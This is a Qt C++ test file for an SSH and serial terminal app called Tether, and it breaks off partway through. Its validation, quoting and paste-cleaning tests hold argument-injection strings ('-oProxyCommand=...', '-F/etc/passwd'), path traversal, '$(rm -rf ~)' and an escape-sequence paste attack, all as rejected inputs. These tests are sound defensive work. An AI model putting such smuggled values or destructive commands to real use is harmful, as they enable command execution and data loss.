#include <QDir>
#include <QFile>
#include <QJsonArray>
#include <QJsonDocument>
#include <QJsonObject>
#include <QRandomGenerator>
#include <QStandardPaths>
#include <QScopeGuard>
#include <QProcess>
#include <QElapsedTimer>
#include <QClipboard>
#include <QGuiApplication>
#include <QInputMethodEvent>
#include <QSignalSpy>
#include <QTemporaryDir>
#include <QtTest>

#include <memory>

#include "assistant.h"
#include "backend.h"
#include "sftp.h"
#include "terminalview.h"
#ifdef TETHER_LIBSSH
#include "sshsession.h"
#endif
#include "updater.h"
#include "serialports.h"
#include "theme.h"
#include "translator.h"

class TetherTests : public QObject {
    Q_OBJECT

private slots:
    void sshCommandUsesEveryField()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        backend.setSetting("shareConnections", false);
        const QVariantMap launch = backend.launch({
            {"kind", "ssh"}, {"name", "Pi"}, {"host", "example.com"}, {"user", "pi"}, {"port", 2222}, {"reconnect", false},
            {"identityFile", "~/.ssh/id_ed25519"}, {"jumpHost", "me@bastion"},
            {"options", "ServerAliveInterval 30\n\nCompression=yes"},
            {"forwards", QVariantList{QVariantMap{{"type", "L"}, {"spec", "8080:localhost:80"}},
                                      QVariantMap{{"type", "D"}, {"spec", "1080"}}}}});
        QVERIFY2(!launch.contains("error"), qPrintable(launch.value("error").toString()));
        QCOMPARE(launch["program"].toString(), QString("/usr/bin/ssh"));
        QCOMPARE(launch["args"].toStringList(),
                 QStringList({"-p", "2222", "-l", "pi", "-i", QDir::homePath() + "/.ssh/id_ed25519",
                              "-J", "me@bastion", "-L", "8080:localhost:80", "-D", "1080",
                              "-o", "ServerAliveInterval=30", "-o", "Compression=yes", "--", "example.com"}));
        QCOMPARE(launch["title"].toString(), QString("Pi"));
        QVERIFY(launch["splittable"].toBool());
    }

    void fieldsCantBecomeSshOptions()
    {
        auto error = [](const QVariantMap &extra) {
            QVariantMap p{{"kind", "ssh"}, {"name", "x"}, {"host", "example.com"}};
            p.insert(extra);
            return Backend::validate(p);
        };
        QVERIFY(error({}).isEmpty());
        QVERIFY(!error({{"host", "-oProxyCommand=touch /tmp/x"}}).isEmpty());
        QVERIFY(!error({{"host", "a b"}}).isEmpty());
        QVERIFY(!error({{"user", "-F/etc/passwd"}}).isEmpty());
        QVERIFY(!error({{"jumpHost", "-oProxyCommand=x"}}).isEmpty());
        QVERIFY(!error({{"port", 70000}}).isEmpty());
        QVERIFY(!error({{"options", "-oProxyCommand=x"}}).isEmpty());
        QVERIFY(!error({{"options", "=nokey"}}).isEmpty());
        QVERIFY(!error({{"forwards", QVariantList{QVariantMap{{"type", "L"}, {"spec", "-oX"}}}}}).isEmpty());
        QVERIFY(!error({{"forwards", QVariantList{QVariantMap{{"type", "X"}, {"spec", "80"}}}}}).isEmpty());
        QVERIFY(error({{"forwards", QVariantList{QVariantMap{{"type", "R"}, {"spec", "*:9000:[::1]:22"}}}}}).isEmpty());
        QVERIFY(error({{"host", "fe80::1%eth0"}}).isEmpty());
    }

    void serialCommandAndChecks()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("picocom", "/usr/bin/picocom");

        // A file the test can open stands in for the device; validation only
        // takes /dev paths, so check the command through quickConnect-free launch.
        QVariantMap p{{"kind", "serial"}, {"name", "Board"}, {"device", "/dev/null"}, {"baud", 9600},
                      {"dataBits", 7}, {"parity", "even"}, {"stopBits", 2}, {"flow", "hardware"},
                      {"enter", "crlf"}, {"echo", true}};
        const QVariantMap launch = backend.launch(p);
        QVERIFY2(!launch.contains("error"), qPrintable(launch.value("error").toString()));
        QCOMPARE(launch["args"].toStringList(),
                 QStringList({"--baud", "9600", "--databits", "7", "--parity", "e", "--stopbits", "2",
                              "--flow", "h", "--omap", "crcrlf", "--echo", "/dev/null"}));
        QVERIFY(!launch["splittable"].toBool());

        p["device"] = "/dev/ttyDoesNotExist9";
        QVERIFY(backend.launch(p).value("error").toString().contains("not connected"));
        p["device"] = "/dev/../etc/passwd";
        QVERIFY(!Backend::validate(p).isEmpty());
        p["device"] = "/dev/null";
        p["baud"] = 0;
        QVERIFY(!Backend::validate(p).isEmpty());

        backend.setTool("picocom", "");
        p["baud"] = 9600;
        QVERIFY(backend.launch(p).value("error").toString().contains("picocom"));
    }

    void terminalIsATextFieldToTouchKeyboards()
    {
        TerminalView view;
        view.setSize(QSizeF(800, 400));
        // Qt for Android drops everything an on-screen keyboard sends as text
        // (every letter) unless the focused item has a property with this
        // name, as Qt's own text fields do.
        QVERIFY(view.property("inputMethodHints").isValid());
        QInputMethodQueryEvent query(Qt::ImHints | Qt::ImEnterKeyType | Qt::ImSurroundingText | Qt::ImCursorPosition);
        QCoreApplication::sendEvent(&view, &query);
        const auto hints = Qt::InputMethodHints(query.value(Qt::ImHints).toInt());
        QVERIFY(hints.testFlag(Qt::ImhNoPredictiveText));
        QVERIFY(!hints.testFlag(Qt::ImhHiddenText));
        QCOMPARE(view.property("inputMethodHints").toInt(), int(hints));
        // A Return key: "Done", the default, closes the keyboard after every command.
        QCOMPARE(query.value(Qt::ImEnterKeyType).toInt(), int(Qt::EnterKeyReturn));
        // Something to delete before the cursor, for keyboards that delete that way.
        const QString around = query.value(Qt::ImSurroundingText).toString();
        QVERIFY(!around.isEmpty());
        QCOMPARE(query.value(Qt::ImCursorPosition).toInt(), int(around.size()));

#ifndef Q_OS_WIN
        // Such a keyboard removing the character before the cursor is a Backspace.
        QSignalSpy done(&view, &TerminalView::finished);
        QVERIFY(view.start("/bin/sh", {"-c", "stty -echo; read a; echo \"got:$a\""}));
        QTest::qWait(300);
        auto commit = [&](const QString &text, int from = 0, int length = 0) {
            QInputMethodEvent event;
            event.setCommitString(text, from, length);
            QCoreApplication::sendEvent(&view, &event);
        };
        commit("l"); commit("s"); commit("x"); commit("y");
        commit({}, -1, 1);       // one character back
        commit({}, -1, 1);
        commit(" "); commit("-"); commit("l");
        commit("\n");
        QVERIFY(done.wait(5000));
        QVERIFY2(view.screenText(10).contains("got:ls -l"), qPrintable(view.screenText(10)));
#endif
    }

    void touchKeyboardTextReachesTheProgram()
    {
#ifndef Q_OS_WIN
        // Gboard's way: a word grows as composing text, gets corrected, and is
        // committed later; then Enter. Each letter must reach the program.
        TerminalView view;
        view.setSize(QSizeF(800, 400));
        QSignalSpy done(&view, &TerminalView::finished);
        QVERIFY(view.start("/bin/sh", {"-c", "stty -echo; read a; echo \"got:$a\""}));
        QTest::qWait(300);
        auto compose = [&](const QString &preedit, const QString &commit = {}) {
            QInputMethodEvent event(preedit, {});
            if (!commit.isNull())
                event.setCommitString(commit);
            QCoreApplication::sendEvent(&view, &event);
        };
        compose("y");
        compose("ye");
        compose("yes");
        compose("yez");          // the keyboard changes its mind
        compose("yes");
        compose("", "yes");      // committed, nothing more to type
        compose("x");            // a new word, then deleted by the keyboard
        compose("");
        view.sendKey("enter");
        QVERIFY(done.wait(5000));
        QVERIFY2(view.screenText(10).contains("got:yes"), qPrintable(view.screenText(10)));
#endif
    }

    void pastedTextIsCleanedAndSeveralLinesAreAskedAbout()
    {
        // Escape and the other control characters never reach the program:
        // text copied from a web page can't close the bracketed paste early
        // (ESC [ 201 ~) or send the terminal commands. Tab and Enter stay.
        QCOMPARE(TerminalView::cleanPaste(QString::fromUtf8("ls\x1b[201~\nrm -rf ~\r\n\tdone\x07\x7f\xc2\x9b" "31m é")),
                 QString::fromUtf8("ls[201~\rrm -rf ~\r\tdone31m é"));
#ifndef Q_OS_WIN
        QClipboard *clipboard = QGuiApplication::clipboard();
        TerminalView view;
        view.setSize(QSizeF(800, 400));
        QSignalSpy question(&view, &TerminalView::pasteQuestion);
        QVERIFY(view.start("/bin/sh", {"-c", "stty -echo; while read line; do echo \"got:$line\"; done"}));
        QTest::qWait(300);
        // One line without Enter: typed as it is, to be looked at.
        clipboard->setText("echo one");
        view.pasteClipboard();
        QCOMPARE(question.count(), 0);
        view.sendKey("enter");
        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:echo one"), qPrintable(view.screenText(10)), 5000);
        // Several lines would each run as they land: asked first, nothing sent.
        clipboard->setText("first\nsecond\x1b[201~\n");
        view.pasteClipboard();
        QCOMPARE(question.count(), 1);
        QCOMPARE(question.first().at(0).toString(), QString("first\rsecond[201~\r"));
        QCOMPARE(question.first().at(1).toInt(), 2);
        QTest::qWait(300);
        QVERIFY(!view.screenText(10).contains("got:first"));
        // The answer is yes.
        view.paste(question.first().at(0).toString());
        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:second[201~"), qPrintable(view.screenText(10)), 5000);
        QVERIFY(view.screenText(10).contains("got:first"));
        // A program that asked for bracketed paste shows the lines itself.
        view.feed("\x1b[?2004h");
        clipboard->setText("third\nfourth");
        view.pasteClipboard();
        QCOMPARE(question.count(), 1);
        view.feed("\x1b[?2004l");
        // A touch keyboard's own clipboard pastes by committing the text
        // whole: several lines at once are a paste too, asked about and
        // cleaned; a word and its Enter are still just typing.
        auto commit = [&](const QString &text) {
            QInputMethodEvent event;
            event.setCommitString(text);
            QCoreApplication::sendEvent(&view, &event);
        };
        view.sendKey("enter"); // ends the line the last paste left open
        commit(QString::fromUtf8("seventh\neighth\x1b[201~\n"));
        QCOMPARE(question.count(), 2);
        QCOMPARE(question.last().at(0).toString(), QString("seventh\reighth[201~\r"));
        QTest::qWait(300);
        QVERIFY(!view.screenText(10).contains("got:seventh"));
        commit(QString::fromUtf8("typed\x1b\n"));
        QCOMPARE(question.count(), 2);
        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:typed"), qPrintable(view.screenText(10)), 5000);
        // And the question can be turned off in Settings.
        view.setConfirmPaste(false);
        clipboard->setText("fifth\nsixth\n");
        view.pasteClipboard();
        QCOMPARE(question.count(), 2);
        QTRY_VERIFY2_WITH_TIMEOUT(view.screenText(10).contains("got:sixth"), qPrintable(view.screenText(10)), 5000);
#endif
    }

    void loggedSessionsGetALogFile()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        backend.setSetting("shareConnections", false);
        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "My box/1"}, {"host", "box"}, {"reconnect", false},
                                                   {"options", "RemoteCommand=echo 'hi'"}, {"log", true}});
        QVERIFY2(!launch.contains("error"), qPrintable(launch.value("error").toString()));
        // The terminal writes the log itself, so the command is plain ssh.
        QCOMPARE(launch["program"].toString(), QString("/usr/bin/ssh"));
        QCOMPARE(launch["args"].toStringList(), QStringList({"-o", "RemoteCommand=echo 'hi'", "--", "box"}));
        QVERIFY(launch["logPath"].toString().startsWith(dir.filePath("logs") + "/My_box_1-"));
        QVERIFY(QFileInfo(dir.filePath("logs")).isDir());

        // The terminal appends what it prints to that file.
        TerminalView view;
        view.setLogFile(launch["logPath"].toString());
        QSignalSpy done(&view, &TerminalView::finished);
#ifndef Q_OS_WIN
        QVERIFY(view.start("/bin/sh", {"-c", "echo logged-line"}));
        QVERIFY(done.wait(5000));
        QFile log(launch["logPath"].toString());
        QVERIFY(log.open(QIODevice::ReadOnly));
        QVERIFY(log.readAll().contains("logged-line"));
#endif
    }

    void shellQuoting()
    {
        QCOMPARE(Backend::shellQuote("plain-1.2:3"), QString("plain-1.2:3"));
        QCOMPARE(Backend::shellQuote("a b"), QString("'a b'"));
        QCOMPARE(Backend::shellQuote("it's"), QString("'it'\\''s'"));
        QCOMPARE(Backend::shellQuote("$(rm -rf ~)"), QString("'$(rm -rf ~)'"));
        QCOMPARE(Backend::shellQuote(""), QString("''"));
    }

    void quickConnectParses()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        QVariantMap p = backend.quickConnect("pi@10.0.0.2:2222");
        QCOMPARE(p["user"].toString(), QString("pi"));
        QCOMPARE(p["host"].toString(), QString("10.0.0.2"));
        QCOMPARE(p["port"].toInt(), 2222);
        p = backend.quickConnect("/dev/ttyUSB0 9600");
        QCOMPARE(p["kind"].toString(), QString("serial"));
        QCOMPARE(p["baud"].toInt(), 9600);
        QVERIFY(backend.quickConnect("-oProxyCommand=x").contains("error"));
        QVERIFY(backend.quickConnect("host:notaport").contains("error"));
        QCOMPARE(backend.quickConnect("fe80::1").value("host").toString(), QString("fe80::1"));
    }

    void profilesAndSnippetsPersist()
    {
        QTemporaryDir dir;
        const QString file = dir.filePath("conf/tether.json");
        {
            Backend backend(file, dir.filePath("ssh_config"), dir.filePath("logs"));
            QVERIFY(backend.saveProfile({{"kind", "ssh"}, {"name", "Web"}, {"host", "web.example"},
                                         {"password", "never stored"}}).isEmpty());
            QVERIFY(!backend.saveProfile({{"kind", "ssh"}, {"name", "Bad"}, {"host", "-x"}}).isEmpty());
            QVERIFY(backend.saveSnippet({{"name", "Uptime"}, {"text", "uptime"}, {"run", true}}).isEmpty());
            backend.setFontSize(15);
            QCOMPARE(backend.profiles().size(), 1);

            // Saving an existing id replaces it.
            QVariantMap web = backend.profiles().first().toMap();
            web["name"] = "Web 2";
            QVERIFY(backend.saveProfile(web).isEmpty());
            QCOMPARE(backend.profiles().size(), 1);
        }
        QCOMPARE(QFile::permissions(file) & 0x0077, QFileDevice::Permissions());
        QFile raw(file);
        QVERIFY(raw.open(QIODevice::ReadOnly));
        QVERIFY(!raw.readAll().contains("never stored"));

        Backend reloaded(file, dir.filePath("ssh_config"), dir.filePath("logs"));
        QCOMPARE(reloaded.profiles().size(), 1);
        QCOMPARE(reloaded.profiles().first().toMap()["name"].toString(), QString("Web 2"));
        QCOMPARE(reloaded.snippets().size(), 1);
        QCOMPARE(reloaded.fontSize(), 15);
        QVERIFY(reloaded.removeProfile(reloaded.profiles().first().toMap()["id"].toString()).isEmpty());
        QCOMPARE(reloaded.profiles().size(), 0);
    }

    void settingsPersistAndAreChecked()
    {
        QTemporaryDir dir;
        const QString file = dir.filePath("tether.json");
        {
            Backend backend(file, dir.filePath("ssh_config"), dir.filePath("logs"));
            QCOMPARE(backend.settings().value("accent").toString(), QString("blue"));
            QSignalSpy changed(&backend, &Backend::settingsChanged);
            QVERIFY(backend.setSetting("accent", "green").isEmpty());
            QVERIFY(backend.setSetting("interfaceFontSize", 99).isEmpty());
            QVERIFY(backend.setSetting("blinkingCursor", true).isEmpty());
            QCOMPARE(changed.count(), 3);
            // Setting a value it already has changes nothing.
            QVERIFY(backend.setSetting("accent", "green").isEmpty());
            QCOMPARE(changed.count(), 3);
            QVERIFY(!backend.setSetting("nonsense", 1).isEmpty());
            QVERIFY(!backend.setSetting("lineSpacing", "wide").isEmpty());
            QVERIFY(!backend.setSetting("shell", dir.filePath("no-such-shell")).isEmpty());
            QCOMPARE(backend.settings().value("interfaceFontSize").toInt(), 18);
        }
        QFile raw(file);
        QVERIFY(raw.open(QIODevice::ReadOnly));
        const QJsonObject stored = QJsonDocument::fromJson(raw.readAll()).object().value("settings").toObject();
        // Only what differs from the defaults is written.
        QCOMPARE(stored.keys(), QStringList({"accent", "blinkingCursor", "interfaceFontSize"}));

        Backend reloaded(file, dir.filePath("ssh_config"), dir.filePath("logs"));
        QCOMPARE(reloaded.settings().value("accent").toString(), QString("green"));
        QCOMPARE(reloaded.settings().value("blinkingCursor").toBool(), true);
        QVERIFY(reloaded.resetSettings().isEmpty());
        QCOMPARE(reloaded.settings(), Backend::defaultSettings());
    }

    void localShellSetting()
    {
        QTemporaryDir dir;
        const QString shell = dir.filePath("myshell");
        write(shell, "#!/bin/sh\n");
        QFile::setPermissions(shell, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        QVERIFY(backend.setSetting("shell", shell).isEmpty());
        QCOMPARE(backend.launch({{"kind", "local"}}).value("program").toString(), shell);
    }

    void builtinSchemeColors()
    {
        QTemporaryDir dir;
        Theme theme(dir.filePath("no-omarchy"));
        QVERIFY(!theme.hasOmarchy());
        QVERIFY(theme.builtinSchemes().contains("Solarized Dark"));
        const QVariantMap solarized = theme.schemeColors("Solarized Dark");
        QCOMPARE(solarized.value("background").toString(), QString("#002b36"));
        QCOMPARE(solarized.value("palette").toList().size(), 16);
        QCOMPARE(solarized.value("preview").toList().first().toString(), QString("#dc322f"));
        QVERIFY(theme.schemeColors("Missing").isEmpty());
        // Without Omarchy, "omarchy" is Tether Dark.
        QCOMPARE(theme.schemeColors("omarchy").value("background"), theme.schemeColors("Tether Dark").value("background"));
    }

    void unreadableFileIsKept()
    {
        QTemporaryDir dir;
        const QString file = dir.filePath("tether.json");
        write(file, "{ not json");
        Backend backend(file, dir.filePath("ssh_config"), dir.filePath("logs"));
        QVERIFY(!backend.loadError().isEmpty());
        QVERIFY(!QFile::exists(file));
        QCOMPARE(QDir(dir.path()).entryList({"tether.json.unreadable-*"}).size(), 1);
    }

    void droppedConnectionsReconnectAndTmuxKeepsTheShell()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "Web 01"}, {"host", "web"},
                                                   {"persistent", true}});
        QVERIFY2(!launch.contains("error"), qPrintable(launch.value("error").toString()));
        // The pane reconnects when ssh exits with 255; the command is plain ssh.
        QCOMPARE(launch["program"].toString(), QString("/usr/bin/ssh"));
        QVERIFY(launch["reconnect"].toBool());
        const QStringList args = launch["args"].toStringList();
        QCOMPARE(args.first(), QString("-t"));
        QVERIFY(args.contains("ServerAliveInterval=15"));
        QVERIFY(args.contains("ControlMaster=auto"));
        QCOMPARE(args.mid(args.size() - 3, 2), QStringList({"--", "web"}));
        QVERIFY(args.last().startsWith("tmux new-session -A -s tether-web-01 "));
        QVERIFY(!backend.launch({{"kind", "ssh"}, {"name", "x"}, {"host", "web"}, {"reconnect", false}})["reconnect"].toBool());

        // A split gets its own tmux session.
        const QVariantMap split = backend.launch({{"kind", "ssh"}, {"name", "Web 01"}, {"host", "web"},
                                                  {"persistent", true}, {"tmuxSession", "Web 01 2"}});
        QVERIFY(split["args"].toStringList().last().contains("tether-web-01-2"));
        QCOMPARE(Backend::tmuxSessionName("  "), QString("tether-session"));
    }

    void moshCarriesTheSshOptions()
    {
        QTemporaryDir dir;
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        backend.setTool("mosh", "/usr/bin/mosh");
        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "Pi"}, {"host", "pi"}, {"user", "me"},
                                                   {"port", 2200}, {"transport", "mosh"}});
        QVERIFY2(!launch.contains("error"), qPrintable(launch.value("error").toString()));
        QCOMPARE(launch["program"].toString(), QString("/usr/bin/mosh"));
        const QStringList args = launch["args"].toStringList();
        QVERIFY(args[0].startsWith("--ssh=/usr/bin/ssh -p 2200 -l me"));
        QVERIFY(!args[0].contains("ControlMaster"));
        QCOMPARE(args.mid(1), QStringList({"--", "me@pi"}));
        QVERIFY(!Backend::validate({{"kind", "ssh"}, {"name", "x"}, {"host", "pi"}, {"transport", "mosh"},
                                    {"forwards", QVariantList{QVariantMap{{"type", "D"}, {"spec", "1080"}}}}}).isEmpty());
        QVERIFY(!Backend::validate({{"kind", "ssh"}, {"name", "x"}, {"host", "pi"}, {"transport", "telnet"}}).isEmpty());
    }

    void snippetPlaceholders()
    {
        QCOMPARE(Backend::snippetVariables("git checkout {{branch}} && echo {{ branch }} {{host}} {{env}}"),
                 QStringList({"branch", "env"}));
        QCOMPARE(Backend::snippetPayload({{"text", "deploy {{branch}} to {{host}} {{missing}}"}},
                                         {{"branch", "main"}, {"host", "web"}}),
                 QString("deploy main to web {{missing}}"));
        QVERIFY(Backend::snippetPayload({{"text", "{{date}}"}}).contains('-'));
    }

    void vaultLoginsFillHostsAndKeepPasswordsInTheKeyring()
    {
        QTemporaryDir dir;
        // A stand-in for secret-tool that records what it was asked.
        const QString fake = dir.filePath("secret-tool");
        QFile script(fake);
        QVERIFY(script.open(QIODevice::WriteOnly));
        script.write(QString("#!/bin/sh\necho \"$@\" >> '%1'\ncat >> '%1'\necho >> '%1'\n").arg(dir.filePath("calls")).toUtf8());
        script.close();
        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);

        const QString file = dir.filePath("tether.json");
        Backend backend(file, dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        backend.setTool("env", "/usr/bin/env");
        backend.setTool("secret-tool", fake);
        QVERIFY(!backend.saveIdentity({{"name", ""}}, {}).isEmpty());
        // The keyring is asked in the background; identitySaved says how it went.
        QSignalSpy saved_(&backend, &Backend::identitySaved);
        QCOMPARE(backend.saveIdentity({{"name", "Deploy"}, {"user", "deploy"}, {"identityFile", "~/.ssh/deploy"}}, "hunter2"),
                 QString());
        QVERIFY(backend.identities().isEmpty());
        // One at a time: a second save waits for the first.
        QVERIFY(!backend.saveIdentity({{"name", "Other"}}, "x").isEmpty());
        QVERIFY(saved_.wait(5000));
        QCOMPARE(saved_.first().first().toString(), QString());
        const QVariantMap login = backend.identities().value(0).toMap();
        QVERIFY(login["hasPassword"].toBool());
        // A login without a password is answered the same way, a moment later.
        QCOMPARE(backend.saveIdentity({{"name", "Plain"}, {"user", "me"}}, {}), QString());
        QVERIFY(saved_.wait(5000));
        QCOMPARE(backend.identities().size(), 2);
        QCOMPARE(backend.removeIdentity(backend.identities().value(1).toMap()["id"].toString()), QString());

        QFile calls(dir.filePath("calls"));
        QVERIFY(calls.open(QIODevice::ReadOnly));
        const QString recorded = QString::fromUtf8(calls.readAll());
        QVERIFY(recorded.contains("store --label=Tether: Deploy service tether identity " + login["id"].toString()));
        QVERIFY(recorded.contains("hunter2"));

        // The password is nowhere in Tether's own file.
        QFile saved(file);
        QVERIFY(saved.open(QIODevice::ReadOnly));
        QVERIFY(!saved.readAll().contains("hunter2"));

        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "Web"}, {"host", "web"},
                                                   {"identityId", login["id"]}, {"reconnect", false}});
        const QStringList args = launch["args"].toStringList();
        const QStringList env = launch["environment"].toStringList();
        QCOMPARE(launch["program"].toString(), QString("/usr/bin/ssh"));
        QVERIFY(env.contains("SSH_ASKPASS_REQUIRE=force"));
        QVERIFY(env.contains("TETHER_IDENTITY=" + login["id"].toString()));
        QVERIFY(args.contains("deploy"));
        QVERIFY(args.contains(QDir::homePath() + "/.ssh/deploy"));
        QVERIFY(!(args + env).join(' ').contains("hunter2"));

        QCOMPARE(backend.removeIdentity(login["id"].toString()), QString());
        QVERIFY(backend.identities().isEmpty());
        // The keyring is told to drop the password, without being waited for.
        QTRY_VERIFY_WITH_TIMEOUT(([&] {
            QFile again(dir.filePath("calls"));
            return again.open(QIODevice::ReadOnly)
                && again.readAll().contains(("clear service tether identity " + login["id"].toString()).toUtf8());
        })(), 5000);

        // A keyring that fails says why, and the login isn't saved.
        write(fake, "#!/bin/sh\necho 'keyring is locked' >&2\nexit 1\n");
        QCOMPARE(backend.saveIdentity({{"name", "Locked"}}, "pw"), QString());
        QVERIFY(saved_.wait(5000));
        QVERIFY(saved_.last().first().toString().contains("keyring is locked"));
        QVERIFY(backend.identities().isEmpty());
    }

    void slowHelpersDontBlockTheWindow()
    {
        // ssh's "is the connection up?" is asked without waiting for it, so a
        // slow host can't freeze the window while startup snippets wait.
        QTemporaryDir dir;
        const QString slow = dir.filePath("ssh");
        write(slow, QString("#!/bin/sh\necho \"$@\" > '%1'\nsleep 0.4\nexit 0\n").arg(dir.filePath("args")).toUtf8());
        QFile::setPermissions(slow, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", slow);
        QSignalSpy checked(&backend, &Backend::connectionChecked);
        const QVariantMap host{{"kind", "ssh"}, {"name", "Web"}, {"host", "web"}, {"user", "me"}, {"port", 2222}};
        QElapsedTimer asking;
        asking.start();
        backend.checkConnection(host, "pane-1");
        backend.checkConnection(host, "pane-1"); // still out: not asked twice
        QVERIFY2(asking.elapsed() < 200, qPrintable(QString("asking took %1 ms").arg(asking.elapsed())));
        QVERIFY(checked.wait(5000));
        QCOMPARE(checked.count(), 1);
        QCOMPARE(checked.first().at(0).toString(), QString("pane-1"));
        QVERIFY(checked.first().at(1).toBool());
        QFile args(dir.filePath("args"));
        QVERIFY(args.open(QIODevice::ReadOnly));
        const QString asked = QString::fromUtf8(args.readAll());
        QVERIFY2(asked.startsWith("-O check -o ControlPath="), qPrintable(asked));
        QVERIFY(asked.trimmed().endsWith("-p 2222 -l me -- web"));

        // Not up, a program that hangs (cut off after a moment), and no ssh at all.
        write(slow, "#!/bin/sh\nexit 255\n");
        backend.checkConnection(host, "pane-2");
        QVERIFY(checked.wait(5000));
        QVERIFY(!checked.last().at(1).toBool());
        write(slow, "#!/bin/sh\nexec sleep 30\n");
        backend.checkConnection(host, "pane-3");
        QVERIFY(checked.wait(5000));
        QVERIFY(!checked.last().at(1).toBool());
        backend.setTool("ssh", dir.filePath("missing"));
        backend.checkConnection(host, "pane-4");
        QVERIFY(checked.wait(5000));
        QVERIFY(!checked.last().at(1).toBool());
        // Nothing to wait for where there's no shared connection.
        backend.checkConnection({{"kind", "serial"}, {"name", "x"}, {"device", "/dev/ttyUSB0"}}, "pane-5");
        QVERIFY(checked.wait(1000));
        QVERIFY(checked.last().at(1).toBool());
    }

    void askpassScriptUsesTethersOwnFolder()
    {
#ifndef Q_OS_WIN
        // The helper keeps its "already offered the saved password" mark in
        // the folder Tether made, whatever XDG_RUNTIME_DIR says or doesn't.
        QTemporaryDir dir;
        const QString fake = dir.filePath("secret-tool");
        write(fake, QString("#!/bin/sh\ncase \"$1\" in lookup) echo hunter2;; store) cat > /dev/null;; esac\n").toUtf8());
        QFile::setPermissions(fake, QFile::ReadOwner | QFile::WriteOwner | QFile::ExeOwner);
        Backend backend(dir.filePath("tether.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        backend.setTool("ssh", "/usr/bin/ssh");
        backend.setTool("secret-tool", fake);
        QSignalSpy saved_(&backend, &Backend::identitySaved);
        QCOMPARE(backend.saveIdentity({{"name", "Deploy"}, {"user", "deploy"}}, "hunter2"), QString());
        QVERIFY(saved_.wait(5000));
        const QString id = backend.identities().value(0).toMap()["id"].toString();
        const QVariantMap launch = backend.launch({{"kind", "ssh"}, {"name", "Web"}, {"host", "web"}, {"identityId", id}});
        QString helper;
        for (const QString &pair : launch["environment"].toStringList())
            if (pair.startsWith("SSH_ASKPASS="))
                helper = pair.mid(12);
        QVERIFY(QFileInfo(helper).isExecutable());
        QFile script(helper);
        QVERIFY(script.open(QIODevice::ReadOnly));
        const QString text = QString::fromUtf8(script.readAll());
        const QString folder = QFileInfo(helper).absolutePath();
        QVERIFY2(text.contains("dir=" + Backend::shellQuote(folder) + "\n"), qPrintable(text));
        QVERIFY(!text.contains("XDG_RUNTIME_DIR"));

        // Run as ssh would, with XDG_RUNTIME_DIR unset: the saved password
        // is offered once, and not again to the same ssh process.
        auto ask = [&](QString *out) {
            QProcess p;
            QProcessEnvironment env = QProcessEnvironment::systemEnvironment();
            env.remove("XDG_RUNTIME_DIR");
            env.insert("TETHER_IDENTITY", id);
            env.insert("TETHER_ASKPASS_NOTTY", "1");
            env.insert("PATH", dir.path() + ":" + env.value("PATH"));
            p.setProcessEnvironment(env);
            p.start(helper, {"deploy@web's password: "});
            if (!p.waitForFinished(10000))
                return -1;
            *out = QString::fromUtf8(p.readAllStandardOutput()).trimmed();
            return p.exitCode();
        };
        QString out;
        QCOMPARE(ask(&out), 0);
        QCOMPARE(out, QString("hunter2"));
        QCOMPARE(ask(&out), 1); // a wrong saved password isn't tried until the account locks
        QVERIFY(!QDir(folder).entryList({"askpass-*"}).isEmpty());
#endif
    }

    void syncFolderCarriesHostsBetweenComputers()
    {
        QTemporaryDir dir;
        QDir().mkpath(dir.filePath("shared"));
        Backend a(dir.filePath("a.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        Backend b(dir.filePath("b.json"), dir.filePath("ssh_config"), dir.filePath("logs"));
        QVERIFY(!a.setSetting("syncFolder", dir.filePath("missing")).isEmpty());
        QCOMPARE(a.saveProfile({{"kind", "ssh"}, {"name", "Web"}, {"host", "web.example"}}), QString());
        QCOMPARE(a.setSetting("syncFolder", dir.filePath("shared")), QString());
        QVERIFY(QFile::exists(dir.filePath("shared/tether-hosts.json")));

        QCOMPARE(b.saveProfile({{"kind", "ssh"}, {"name", "Db"}, {"host", "db.example"}}), QString());
        QCOMPARE(b.setSetting("syncFolder", dir.filePath("shared")), QString());
        QCOMPARE(b.profiles().size(), 2);
        // a hears about b's host through the file watcher.
        QTRY_COMPARE_WITH_TIMEOUT(a.profiles().size(), 2, 5000);

        const QString id = a.profiles().value(0).toMap().value("id").toString();
        QCOMPARE(a.removeProfile(id), QString());
        QTRY_COMPARE_WITH_TIMEOUT(b.profiles().size(), 1, 5000);
        // Host names and key paths in the shared file are nobody else's to read.
        QCOMPARE(QFileInfo(dir.filePath("shared/tether-hosts.json")).permissions()
                     & (QFile::ReadGroup | QFile::WriteGroup | QFile::ReadOther | QFile::WriteOther),
                 QFile::Permissions());
    }

    // Sync tests write the shared file as another computer, or an intruder, would.
    static QJsonObject readSync(const QString &path)
    {
        QFile file(path);
